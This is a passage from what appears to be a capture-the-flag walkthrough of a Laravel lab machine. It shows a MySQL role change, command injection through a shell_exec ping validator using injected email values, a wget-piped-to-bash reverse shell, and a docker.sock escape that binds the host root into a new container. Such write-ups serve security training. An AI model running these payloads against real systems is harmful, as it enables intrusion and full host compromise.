+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="ex">MySQL</span> <span class="pp">[</span><span class="ss">webapp</span><span class="pp">]</span><span class="op">&gt;</span> select <span class="pp">*</span> from users where email = <span class="st">'juliana@snippet.htb'</span><span class="kw">;</span></span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span>
+<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="fu">id</span>  <span class="kw">|</span> <span class="ex">name</span>          <span class="kw">|</span> <span class="ex">email</span>               <span class="kw">|</span> <span class="ex">email_verified_at</span>   <span class="kw">|</span> <span class="ex">password</span>                                                         <span class="kw">|</span> <span class="ex">remember_token</span>                                               <span class="kw">|</span> <span class="ex">created_at</span>          <span class="kw">|</span> <span class="ex">updated_at</span>          <span class="kw">|</span> <span class="ex">user_type</span> <span class="kw">|</span></span>
+<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span>
+<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">701</span> <span class="kw">|</span> <span class="ex">Juliana</span> Thiel <span class="kw">|</span> <span class="ex">juliana@snippet.htb</span> <span class="kw">|</span> <span class="ex">2022-01-02</span> 20:15:32 <span class="kw">|</span> <span class="ex">ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f</span> <span class="kw">|</span> <span class="ex">ogRS7mYef6bK1KDFu0Svdm1C3AwnpBFhiWKRaMV92ubm4nmMmAIcoJRVhcUF</span> <span class="kw">|</span> <span class="ex">2022-01-02</span> 20:15:37 <span class="kw">|</span> <span class="ex">2022-06-20</span> 11:46:35 <span class="kw">|</span> <span class="ex">Member</span>    <span class="kw">|</span></span>
+<span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span>
+<span id="cb28-10"><a href="#cb28-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-11"><a href="#cb28-11" aria-hidden="true" tabindex="-1"></a><span class="ex">MySQL</span> <span class="pp">[</span><span class="ss">webapp</span><span class="pp">]</span><span class="op">&gt;</span> update users set user_type = <span class="st">'Manager'</span> where users.id = 701<span class="kw">;</span></span>
+<span id="cb28-12"><a href="#cb28-12" aria-hidden="true" tabindex="-1"></a><span class="ex">Query</span> OK, 1 row affected <span class="er">(</span><span class="ex">0.034</span> sec<span class="kw">)</span></span>
+<span id="cb28-13"><a href="#cb28-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Rows</span> matched: 1  Changed: 1  Warnings: 0</span>
+<span id="cb28-14"><a href="#cb28-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-15"><a href="#cb28-15" aria-hidden="true" tabindex="-1"></a><span class="ex">MySQL</span> <span class="pp">[</span><span class="ss">webapp</span><span class="pp">]</span><span class="op">&gt;</span> select <span class="pp">*</span> from users where email = <span class="st">'juliana@snippet.htb'</span><span class="kw">;</span></span>
+<span id="cb28-16"><a href="#cb28-16" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span>
+<span id="cb28-17"><a href="#cb28-17" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="fu">id</span>  <span class="kw">|</span> <span class="ex">name</span>          <span class="kw">|</span> <span class="ex">email</span>               <span class="kw">|</span> <span class="ex">email_verified_at</span>   <span class="kw">|</span> <span class="ex">password</span>                                                         <span class="kw">|</span> <span class="ex">remember_token</span>                                               <span class="kw">|</span> <span class="ex">created_at</span>          <span class="kw">|</span> <span class="ex">updated_at</span>          <span class="kw">|</span> <span class="ex">user_type</span> <span class="kw">|</span></span>
+<span id="cb28-18"><a href="#cb28-18" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span>
+<span id="cb28-19"><a href="#cb28-19" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">701</span> <span class="kw">|</span> <span class="ex">Juliana</span> Thiel <span class="kw">|</span> <span class="ex">juliana@snippet.htb</span> <span class="kw">|</span> <span class="ex">2022-01-02</span> 20:15:32 <span class="kw">|</span> <span class="ex">ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f</span> <span class="kw">|</span> <span class="ex">ogRS7mYef6bK1KDFu0Svdm1C3AwnpBFhiWKRaMV92ubm4nmMmAIcoJRVhcUF</span> <span class="kw">|</span> <span class="ex">2022-01-02</span> 20:15:37 <span class="kw">|</span> <span class="ex">2022-06-20</span> 11:46:35 <span class="kw">|</span> <span class="ex">Manager</span>   <span class="kw">|</span></span>
+<span id="cb28-20"><a href="#cb28-20" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="step-2-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
+<p>Logging in as <code>juliana@snippet.htb</code> it doesn’t seem like anything special happened. The only new feature we have is to <em>“Show all”</em> snippets, that including private ones:</p>
+<p><img src="images/extension09.png" class="img-fluid"></p>
+<p>And this <em>“Validate”</em> button for all the users:</p>
+<p><img src="images/extension10.png" class="img-fluid"></p>
+<p>Pressing <em>Validate</em> will send a post request to validate the email of the user, and we’ll get the response <em>“Mail is valid!”</em>.</p>
+<p>Playing around in MySQL I tried to change email of <em>Kaleigh Lehner</em> and noticed that entering <code>;</code>, <code>&amp;</code> or <code>|</code> still registered as valid email. Instead of guessing I decide to look in to the source code to see how this function works and find this:</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode php code-with-copy"><code class="sourceCode php"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a>jean<span class="pp">@</span>extension<span class="ot">:</span><span class="op">~/</span>projects<span class="op">/</span>laravel<span class="op">-</span>app<span class="op">/</span>app<span class="op">/</span>Http<span class="op">/</span>Controllers$ cat AdminController<span class="op">.</span>php</span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a>[... snip ...]</span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a>} <span class="cf">else</span> {</span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a>    <span class="va">$res</span> <span class="op">=</span> <span class="fu">shell_exec</span>(<span class="st">"ping -c1 -W1 </span><span class="va">$domain</span><span class="st"> &gt; /dev/null &amp;&amp; echo 'Mail is valid!' || echo 'Mail is not valid!'"</span>)<span class="ot">;</span></span>
+<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> Redirect::back()-&gt;with(<span class="st">'message'</span><span class="ot">,</span> <span class="fu">trim</span>(<span class="va">$res</span>))<span class="ot">;</span></span>
+<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a>}</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The input data isn’t sanitized since we can write directly into the MySQL database and from the vulnerable <code>shell_exec</code> function get command injection.</p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="ex">MySQL</span> <span class="pp">[</span><span class="ss">webapp</span><span class="pp">]</span><span class="op">&gt;</span> update users set email = <span class="st">"&amp;id&amp;"</span> where users.id = 895<span class="kw">;</span></span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Query</span> OK, 1 row affected <span class="er">(</span><span class="ex">0.035</span> sec<span class="kw">)</span></span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Rows</span> matched: 1  Changed: 1  Warnings: 0</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Press <em>“VALIDATE”</em> to execute command:</p>
+<p><img src="images/extension11.png" class="img-fluid"></p>
+<p>Setup a reverse shell payload to get foothold on the docker container:</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension echo <span class="st">"bash -i &gt;&amp; /dev/tcp/10.10.14.10/4488 0&gt;&amp;1"</span> <span class="op">&gt;</span> rev.sh</span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension chmod +x rev.sh </span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension python3 <span class="at">-m</span> http.server 80</span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a><span class="ex">MySQL</span> <span class="pp">[</span><span class="ss">webapp</span><span class="pp">]</span><span class="op">&gt;</span> update users set email = <span class="st">"&amp;wget -qO- http://10.10.14.10/rev.sh | bash&amp;"</span> where users.id = 895<span class="kw">;</span></span>
+<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Query</span> OK, 1 row affected <span class="er">(</span><span class="ex">0.033</span> sec<span class="kw">)</span></span>
+<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Rows</span> matched: 1  Changed: 1  Warnings: 0</span>
+<span id="cb31-8"><a href="#cb31-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb31-9"><a href="#cb31-9" aria-hidden="true" tabindex="-1"></a><span class="co">## PRESS 'VALIDATE'</span></span>
+<span id="cb31-10"><a href="#cb31-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb31-11"><a href="#cb31-11" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.171</span> <span class="at">-</span> <span class="at">-</span> [11/Sep/2022 18:31:18] <span class="st">"GET /rev.sh HTTP/1.1"</span> 200 <span class="at">-</span></span>
+<span id="cb31-12"><a href="#cb31-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb31-13"><a href="#cb31-13" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension nc <span class="at">-lvnp</span> 4488</span>
+<span id="cb31-14"><a href="#cb31-14" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4488 ...</span>
+<span id="cb31-15"><a href="#cb31-15" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.10</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.171]</span> 53454</span>
+<span id="cb31-16"><a href="#cb31-16" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> cannot set terminal process group <span class="er">(</span><span class="ex">46</span><span class="kw">)</span><span class="bu">:</span> Inappropriate ioctl for device</span>
+<span id="cb31-17"><a href="#cb31-17" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> no job control in this shell</span>
+<span id="cb31-18"><a href="#cb31-18" aria-hidden="true" tabindex="-1"></a><span class="ex">application@4dae106254bf:/var/www/html/public$</span> id</span>
+<span id="cb31-19"><a href="#cb31-19" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">application</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">application</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">application</span><span class="kw">)</span><span class="ex">,999</span><span class="er">(</span><span class="ex">app</span><span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="step-3-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
+<p>Upload <code>deepce.sh</code> and enumerate the container.</p>
+<div class="sourceCode" id="cb32"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="ex">application@4dae106254bf:/dev/shm$</span> wget http://10.10.14.10/deepce.sh</span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="ex">application@4dae106254bf:/dev/shm$</span> chmod +x deepce.sh</span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="ex">application@4dae106254bf:/dev/shm$</span> bash deepce.sh</span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Dangerous Capabilities .. Yes</span>
+<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a><span class="ex">cap_dac_override</span></span>
+<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb32-9"><a href="#cb32-9" aria-hidden="true" tabindex="-1"></a><span class="ex">====================================</span><span class="er">(</span> <span class="ex">Enumerating</span> Mounts <span class="kw">)</span><span class="ex">====================================</span></span>
+<span id="cb32-10"><a href="#cb32-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Docker sock mounted ....... Yes</span>
+<span id="cb32-11"><a href="#cb32-11" aria-hidden="true" tabindex="-1"></a><span class="ex">The</span> docker sock is writable, we should be able to enumerate docker, create containers </span>
+<span id="cb32-12"><a href="#cb32-12" aria-hidden="true" tabindex="-1"></a><span class="ex">and</span> obtain root privs on the host machine</span>
+<span id="cb32-13"><a href="#cb32-13" aria-hidden="true" tabindex="-1"></a><span class="ex">See</span> https://stealthcopter.github.io/deepce/guides/docker-sock.md</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Lets try to escape through the mounted docker socket.</p>
+<div class="sourceCode" id="cb33"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">application@4dae106254bf:/dev/shm$</span> find / <span class="at">-name</span> docker.sock <span class="dv">2</span><span class="op">&gt;</span>/dev/null    </span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/app/docker.sock</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Google for <em>“exploit docker sock”</em> and the <a href="https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25">first hit</a> is a nice bash script to escape. Follow the script step-by-step.</p>
+<ol type="1">
+<li>Find available images:</li>
+</ol>
+<div class="sourceCode" id="cb34"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="ex">application@4dae106254bf:/dev/shm$</span> curl <span class="at">-s</span> <span class="at">--unix-socket</span> /app/docker.sock http://localhost/images/json</span>
+<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[</span><span class="dt">{</span><span class="st">"Containers"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Created"</span><span class="dt">:1656086146</span><span class="op">,</span><span class="st">"Id"</span><span class="dt">:</span><span class="st">"sha256:b97d15b16a2172a201a80266877a65a44b0d7fa31c29531c20cdcc8e98c2d227"</span><span class="op">,</span><span class="st">"Labels"</span><span class="dt">:{</span><span class="st">"io.webdevops.layout"</span><span class="dt">:</span><span class="st">"8"</span><span class="op">,</span><span class="st">"io.webdevops.version"</span><span class="dt">:</span><span class="st">"1.5.0"</span><span class="op">,</span><span class="st">"maintainer"</span><span class="dt">:</span><span class="st">"info@webdevops.io"</span><span class="op">,</span><span class="st">"vendor"</span><span class="dt">:</span><span class="st">"WebDevOps.io"</span><span class="dt">}</span><span class="op">,</span><span class="st">"ParentId"</span><span class="dt">:</span><span class="st">"sha256:762bfd88e0120a1018e9a4ccbe56d654c27418c7183ff4a817346fd2ac8b69af"</span><span class="op">,</span><span class="st">"RepoDigests"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"RepoTags"</span><span class="dt">:[</span><span class="st">"laravel-app_main:latest"</span><span class="dt">]</span><span class="op">,</span><span class="st">"SharedSize"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Size"</span><span class="dt">:1975239137</span><span class="op">,</span><span class="st">"VirtualSize"</span><span class="dt">:1975239137}</span><span class="ex">,</span><span class="dt">{</span><span class="st">"Containers"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Created"</span><span class="dt">:1655515586</span><span class="op">,</span><span class="st">"Id"</span><span class="dt">:</span><span class="st">"sha256:ca37554c31eb2513cf4b1295d854589124f8740368842be843d2b4324edd4b8e"</span><span class="op">,</span><span class="st">"Labels"</span><span class="dt">:{</span><span class="st">"io.webdevops.layout"</span><span class="dt">:</span><span class="st">"8"</span><span class="op">,</span><span class="st">"io.webdevops.version"</span><span class="dt">:</span><span class="st">"1.5.0"</span><span class="op">,</span><span class="st">"maintainer"</span><span class="dt">:</span><span class="st">"info@webdevops.io"</span><span class="op">,</span><span class="st">"vendor"</span><span class="dt">:</span><span class="st">"WebDevOps.io"</span><span class="dt">}</span><span class="op">,</span><span class="st">"ParentId"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"RepoDigests"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"RepoTags"</span><span class="dt">:[</span><span class="st">"webdevops/php-apache:7.4"</span><span class="dt">]</span><span class="op">,</span><span class="st">"SharedSize"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Size"</span><span class="dt">:1028279761</span><span class="op">,</span><span class="st">"VirtualSize"</span><span class="dt">:1028279761}</span><span class="ex">,</span><span class="dt">{</span><span class="st">"Containers"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Created"</span><span class="dt">:1640902141</span><span class="op">,</span><span class="st">"Id"</span><span class="dt">:</span><span class="st">"sha256:6af04a6ff8d579dc4fc49c3f3afcaef2b9f879a50d8b8a996db2ebe88b3983ce"</span><span class="op">,</span><span class="st">"Labels"</span><span class="dt">:{</span><span class="st">"maintainer"</span><span class="dt">:</span><span class="st">"Thomas Bruederli &lt;thomas@roundcube.net&gt;"</span><span class="dt">}</span><span class="op">,</span><span class="st">"ParentId"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"RepoDigests"</span><span class="dt">:[</span><span class="st">"roundcube/roundcubemail@sha256:f5b054716e2fdf06f4c5dbee70bc6e056b831ca94508ba0fc1fcedc8c00c5194"</span><span class="dt">]</span><span class="op">,</span><span class="st">"RepoTags"</span><span class="dt">:[</span><span class="st">"roundcube/roundcubemail:latest"</span><span class="dt">]</span><span class="op">,</span><span class="st">"SharedSize"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Size"</span><span class="dt">:612284073</span><span class="op">,</span><span class="st">"VirtualSize"</span><span class="dt">:612284073}</span><span class="ex">,</span><span class="dt">{</span><span class="st">"Containers"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Created"</span><span class="dt">:1640805761</span><span class="op">,</span><span class="st">"Id"</span><span class="dt">:</span><span class="st">"sha256:c99e357e6daee694f9f431fcc905b130f7a246d8c172841820042983ff8df705"</span><span class="op">,</span><span class="st">"Labels"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"ParentId"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"RepoDigests"</span><span class="dt">:[</span><span class="st">"composer@sha256:5e0407cda029cea056de126ea1199f351489e5835ea092cf2edd1d23ca183656"</span><span class="dt">]</span><span class="op">,</span><span class="st">"RepoTags"</span><span class="dt">:[</span><span class="st">"composer:latest"</span><span class="dt">]</span><span class="op">,</span><span class="st">"SharedSize"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Size"</span><span class="dt">:193476514</span><span class="op">,</span><span class="st">"VirtualSize"</span><span class="dt">:193476514}</span><span class="ex">,</span><span class="dt">{</span><span class="st">"Containers"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Created"</span><span class="dt">:1640297121</span><span class="op">,</span><span class="st">"Id"</span><span class="dt">:</span><span class="st">"sha256:cec4e9432becb39dfc2b911686d8d673b8255fdee4a501fbc1bda87473fb479d"</span><span class="op">,</span><span class="st">"Labels"</span><span class="dt">:{</span><span class="st">"org.opencontainers.image.authors"</span><span class="dt">:</span><span class="st">"The Docker Mailserver Organization on GitHub"</span><span class="op">,</span><span class="st">"org.opencontainers.image.description"</span><span class="dt">:</span><span class="st">"A fullstack but simple mail server (SMTP, IMAP, LDAP, Antispam, Antivirus, etc.). Only configuration files, no SQL database."</span><span class="op">,</span><span class="st">"org.opencontainers.image.documentation"</span><span class="dt">:</span><span class="st">"https://github.com/docker-mailserver/docker-mailserver/blob/master/README.md"</span><span class="op">,</span><span class="st">"org.opencontainers.image.licenses"</span><span class="dt">:</span><span class="st">"MIT"</span><span class="op">,</span><span class="st">"org.opencontainers.image.revision"</span><span class="dt">:</span><span class="st">"061bae6cbfb21c91e4d2c4638d5900ec6bee2802"</span><span class="op">,</span><span class="st">"org.opencontainers.image.source"</span><span class="dt">:</span><span class="st">"https://github.com/docker-mailserver/docker-mailserver"</span><span class="op">,</span><span class="st">"org.opencontainers.image.title"</span><span class="dt">:</span><span class="st">"docker-mailserver"</span><span class="op">,</span><span class="st">"org.opencontainers.image.url"</span><span class="dt">:</span><span class="st">"https://github.com/docker-mailserver"</span><span class="op">,</span><span class="st">"org.opencontainers.image.vendor"</span><span class="dt">:</span><span class="st">"The Docker Mailserver Organization"</span><span class="op">,</span><span class="st">"org.opencontainers.image.version"</span><span class="dt">:</span><span class="st">"refs/tags/v10.4.0"</span><span class="dt">}</span><span class="op">,</span><span class="st">"ParentId"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"RepoDigests"</span><span class="dt">:[</span><span class="st">"mailserver/docker-mailserver@sha256:80d4cff01d4109428c06b33ae8c8af89ebebc689f1fe8c5ed4987b803ee6fa35"</span><span class="dt">]</span><span class="op">,</span><span class="st">"RepoTags"</span><span class="dt">:[</span><span class="st">"mailserver/docker-mailserver:latest"</span><span class="dt">]</span><span class="op">,</span><span class="st">"SharedSize"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Size"</span><span class="dt">:560264926</span><span class="op">,</span><span class="st">"VirtualSize"</span><span class="dt">:560264926}</span><span class="ex">,</span><span class="dt">{</span><span class="st">"Containers"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Created"</span><span class="dt">:1640059378</span><span class="op">,</span><span class="st">"Id"</span><span class="dt">:</span><span class="st">"sha256:badd93b4fdf82c3fc9f2c6bc12c15da84b7635dc14543be0c1e79f98410f4060"</span><span class="op">,</span><span class="st">"Labels"</span><span class="dt">:{</span><span class="st">"maintainer"</span><span class="dt">:</span><span class="st">"maintainers@gitea.io"</span><span class="op">,</span><span class="st">"org.opencontainers.image.created"</span><span class="dt">:</span><span class="st">"2021-12-21T03:59:32Z"</span><span class="op">,</span><span class="st">"org.opencontainers.image.revision"</span><span class="dt">:</span><span class="st">"877040e6521e48c363cfe461746235dce4ab822b"</span><span class="op">,</span><span class="st">"org.opencontainers.image.source"</span><span class="dt">:</span><span class="st">"https://github.com/go-gitea/gitea.git"</span><span class="op">,</span><span class="st">"org.opencontainers.image.url"</span><span class="dt">:</span><span class="st">"https://github.com/go-gitea/gitea"</span><span class="dt">}</span><span class="op">,</span><span class="st">"ParentId"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"RepoDigests"</span><span class="dt">:[</span><span class="st">"gitea/gitea@sha256:eafb7459a4a86a0b7da7bfde9ef0726fa0fb64657db3ba2ac590fec0eb4cdd0c"</span><span class="dt">]</span><span class="op">,</span><span class="st">"RepoTags"</span><span class="dt">:[</span><span class="st">"gitea/gitea:1.15.8"</span><span class="dt">]</span><span class="op">,</span><span class="st">"SharedSize"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Size"</span><span class="dt">:148275092</span><span class="op">,</span><span class="st">"VirtualSize"</span><span class="dt">:148275092}</span><span class="ex">,</span><span class="dt">{</span><span class="st">"Containers"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Created"</span><span class="dt">:1640055479</span><span class="op">,</span><span class="st">"Id"</span><span class="dt">:</span><span class="st">"sha256:dd3b2a5dcb48ff61113592ed5ddd762581be4387c7bc552375a2159422aa6bf5"</span><span class="op">,</span><span class="st">"Labels"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"ParentId"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"RepoDigests"</span><span class="dt">:[</span><span class="st">"mysql@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae"</span><span class="dt">]</span><span class="op">,</span><span class="st">"RepoTags"</span><span class="dt">:[</span><span class="st">"mysql:5.6"</span><span class="dt">]</span><span class="op">,</span><span class="st">"SharedSize"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Size"</span><span class="dt">:302527523</span><span class="op">,</span><span class="st">"VirtualSize"</span><span class="dt">:302527523}</span><span class="ex">,</span><span class="dt">{</span><span class="st">"Containers"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Created"</span><span class="dt">:1639694686</span><span class="op">,</span><span class="st">"Id"</span><span class="dt">:</span><span class="st">"sha256:0f7cb85ed8af5c33c1ca00367e4b1e4bfae6ec424f52bb04850af73fb19831d7"</span><span class="op">,</span><span class="st">"Labels"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"ParentId"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"RepoDigests"</span><span class="dt">:[</span><span class="st">"php@sha256:6eb4c063a055e144f4de1426b82526f60d393823cb017add32fb85d79f25b62b"</span><span class="dt">]</span><span class="op">,</span><span class="st">"RepoTags"</span><span class="dt">:[</span><span class="st">"php:7.4-fpm-alpine"</span><span class="dt">]</span><span class="op">,</span><span class="st">"SharedSize"</span><span class="dt">:-1</span><span class="op">,</span><span class="st">"Size"</span><span class="dt">:82510913</span><span class="op">,</span><span class="st">"VirtualSize"</span><span class="dt">:82510913}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>At the top we find <code>laravel-app_main:latest</code> - lets use that one.</p>
+<ol start="2" type="1">
+<li>Declare the <code>cmd</code> variable, change IP address and port to fit our needs. This command will be triggered when we start the container.</li>
+</ol>
+<div class="sourceCode" id="cb35"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">application@4dae106254bf:/dev/shm$</span> cmd=<span class="st">"[</span><span class="dt">\"</span><span class="st">/bin/sh</span><span class="dt">\"</span><span class="st">,</span><span class="dt">\"</span><span class="st">-c</span><span class="dt">\"</span><span class="st">,</span><span class="dt">\"</span><span class="st">chroot /tmp sh -c </span><span class="dt">\\\"</span><span class="st">bash -c 'bash -i &amp;&gt;/dev/tcp/10.10.14.10/4499 0&lt;&amp;1'</span><span class="dt">\\\"\"</span><span class="st">]"</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="3" type="1">
+<li>Create the container and execute command, bind the root filesystem to it, name the container <code>exploit.se_root</code> and execute as detached (-d)</li>
+</ol>
+<div class="sourceCode" id="cb36"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="ex">application@4dae106254bf:/dev/shm$</span> curl <span class="at">-s</span> <span class="at">-X</span> POST <span class="at">--unix-socket</span> /app/docker.sock <span class="at">-d</span> <span class="st">"{</span><span class="dt">\"</span><span class="st">Image</span><span class="dt">\"</span><span class="st">:</span><span class="dt">\"</span><span class="st">laravel-app_main</span><span class="dt">\"</span><span class="st">,</span><span class="dt">\"</span><span class="st">cmd</span><span class="dt">\"</span><span class="st">:</span><span class="va">$cmd</span><span class="st">,</span><span class="dt">\"</span><span class="st">Binds</span><span class="dt">\"</span><span class="st">:[</span><span class="dt">\"</span><span class="st">/:/tmp:rw</span><span class="dt">\"</span><span class="st">]}"</span> <span class="at">-H</span> <span class="st">'Content-Type: application/json'</span> http://localhost/containers/create<span class="pp">?</span>name=exploit.se_root</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="4" type="1">
+<li>Start the container - and trigger the reverse shell</li>
+</ol>
